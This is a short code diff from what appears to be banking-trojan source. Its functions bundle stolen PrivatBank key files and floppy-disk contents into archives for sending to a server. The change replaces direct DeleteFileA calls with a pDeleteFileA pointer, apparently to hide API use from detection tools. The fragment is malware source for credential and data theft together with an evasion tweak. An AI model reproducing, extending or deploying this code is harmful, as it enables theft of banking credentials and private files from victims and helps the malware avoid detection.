@@ -150,7 +150,7 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 
 		DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrSystemPrivat).t_str());
 	}
-	DeleteFileA(FN.t_str());
+	pDeleteFileA(FN.t_str());
 }
 //-----------------------------------------------------------------------------
 
@@ -181,6 +181,6 @@ void SendFloppyDiskToServer(const char* Command, const char* Params)
         if (Added)
 			Added = DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrCabNameDisketa).t_str());
 	}
-    DeleteFileA(FN.t_str());
+    pDeleteFileA(FN.t_str());
 }
 //-----------------------------------------------------------------------------
